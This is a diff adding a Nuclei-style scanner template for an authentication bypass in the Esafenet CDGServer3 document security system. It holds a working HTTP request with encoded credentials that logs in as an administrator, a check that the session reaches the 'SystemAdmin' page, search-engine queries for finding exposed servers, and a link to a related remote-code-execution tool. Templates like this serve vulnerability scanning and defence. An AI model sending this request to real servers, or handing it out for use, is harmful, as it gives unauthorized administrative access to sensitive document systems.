@@ -1,0 +1,38 @@
+id: esafenet-cdgserver3-linkfilterservice-unauth
+
+info:
+  name: 亿赛通电子文档安全管理系统 LinkFilterService - 任意用户登录
+  author: xy
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/K3kliRpX83XzFX8w520Suw
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
+    hunter-query: app.name="ESAFENET 亿赛通文档安全管理系统"
+  tags: esafenet,unauth
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/LinkFilterService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        userId=GCGHGAGGFAFHFGFCFEFPFD&cur=OHBLODPEJJNLEEGIMPOKHMCPJCHJIDHHCJCACB
+
+      - |
+        GET /CDGServer3/nav.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 302 && contains(header_1,'jsessionid=')"
+          - "status_code_2 == 200 && contains(body_2,'SystemAdmin')"
+        condition: and
+
+ # 亿赛通加解密工具：https://github.com/0xf4n9x/CDGXStreamDeserRCE
